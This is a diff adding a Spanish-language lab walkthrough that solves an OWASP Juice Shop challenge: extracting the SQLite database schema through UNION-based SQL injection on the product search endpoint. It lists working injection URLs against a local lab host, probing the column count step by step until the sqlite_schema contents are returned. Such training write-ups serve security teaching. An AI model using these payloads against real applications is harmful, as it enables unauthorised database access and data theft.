@@ -130,17 +130,88 @@ Hacemos clic en el bótón del carrito y veremos como aparecen los dos productos
 ![Carrito](../img/lab-25-D/202211231952.png)
 
 
+## Exfiltrar el esquema de la base de datos.
+
+Los errores que aparecieron el el ejercicio anterior mostraron que la base de datos es ***SQLite***. Es esta base de datos, la tabla del sistema ***sqlite_schema*** contiene el esquema de la base de datos. En esta web, https://www.sqlite.org/faq.html, en el apartado 7, se nos explica los campos que tiene esta tabla. De ellos, el campo ***sql*** contiene la instrucción original que creó la base de datos.
+
+***OBJETIVO***: Exfiltrar el esquema de la base de datos consultando la tabla ***sqlite_schema***.
+
+***PISTAS***: 
+
+* En el ejercicio anterior hemos determinado que la aplicación es susceptible a ataque de inyección de SQL en el endpoint ***/rest/products/search*** usando el parámetro ***q***.
+* También verificamos que usando los caracteres ***'))--*** se podía realizar la consulta.
+* La técnica a emplear hace uso del operador ***UNION*** para conseguir el resutado deseado.
+
+***RESOLUCIÓN***. Los pasos para resolver el reto son.
+
+Usaremos ***ZAP***, así que si no estuviera abierto, lo abrimos y conectamos a la siguiente URL.
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT * FROM x--
+```
+
+Esta instruccion usa el operador ***UNION*** con una tabla que se llama ***x***, que es muy probable que no exista y es ése precisamente el resultado que se obtiene, tal y como se aprecia en la imagen.
+
+![no such table x](../img/lab-25-D/202211232018.png)
+
+Mediante esta técnica podemos determinar si existe o no una tabla en concreto, y en el caso de existir, al usar ***UNION***, devolverá todos sus registros. Así que procedemos a cambiar ***x*** por ***sqlite_schema***. En la URL escribimos lo siguiente,
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT * FROM sqlite_schema--
+```
+
+Como resultado tenemos un mensaje que nos dice que el operador ***UNION*** no tiene el mismo número de columnas, lo que demuestra que la tabla ***sqlite_schema*** se puede consultar.
+
+![not have same number of columns](../img/lab-25-D/202211232022.png)
+
+La técnica en el ataque ***UNION*** es encontrar el número de columnas correcto, así que hay que ir probando. Debemos poner en la URL lo siguiente, hasta que desaparezca el error.
+
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT '1' FROM sqlite_schema--
+```
+
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT '1', '2' FROM sqlite_schema--
+```
+
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3' FROM sqlite_schema--
+```
+
+Seguimos probando hasta este.
+```
+https://192.168.20.60:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+```
+
+Nos fijamos en el último elemento que devuelve el recordset, en este ejemplo el ***44***.
+
+![44](../img/lab-25-D/202211232032.png)
+
+Modificamos ligeramente el ataque para que no aparezcan los productos. Para ello escribimos un producto que no exista seguro, como ***hfhdskfhskdjfhsjkfh***. En la barra de direcciones escribimos.
+```
+https://192.168.20.60:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+```
+
+Como resultado obtenemos lo siguiente.
+
+![columnas](../img/lab-25-D/202211232037.png)
+
+Por último solo hay que reemplazar uno de los valores fijos ('1', '2', ...) con el nombre de la columna correcta, que es ***sql***. En la barra de direcciones escribimos.
+Nota: hemos sustituido ***'1'*** por ***sql***
+```
+https://192.168.20.60:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+```
+
+Como resultado tenemos exfiltrado todo el esquema de la base de datos, ya que la primera columna se sustituye por las instrucciones SQL que se usaron para crear las tablas de dicha base de datos.
+
+![esquema](../img/lab-25-D/202211232044.png)
 
 
 
 
-
-
-
-
-https://pwning.owasp-juice.shop/appendix/solutions.html
 
 https://pwning.owasp-juice.shop/part2/injection.html
+https://pwning.owasp-juice.shop/appendix/solutions.html
+
+
 
 
 
